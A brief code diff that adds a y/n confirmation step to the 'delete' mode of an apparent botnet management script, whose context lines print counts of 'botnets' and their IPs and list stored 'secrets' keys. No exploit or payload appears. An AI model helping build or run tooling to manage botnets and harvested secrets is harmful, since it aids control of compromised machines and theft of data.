@@ -41,6 +41,13 @@ switch (mode) {
     case "delete":
         console.log(`\x1b[32m[+]\x1b[0m Current have botnets: ${await kv.quantity()}`);
         console.log(`\x1b[32m[+]\x1b[0m Current have botnets IP: ${await kv.quantityIP()}`);
+        const answer = prompt("\x1b[32m[?] \x1b[0mAre you sure? (y/n)");
+
+        if (answer !== "y") {
+            console.log("\x1b[31m[!] Canceled\x1b[0m\n");
+            break;
+        }
+
         const list2 = await kv.kv?.list({
             prefix: ["secrets"],
         });
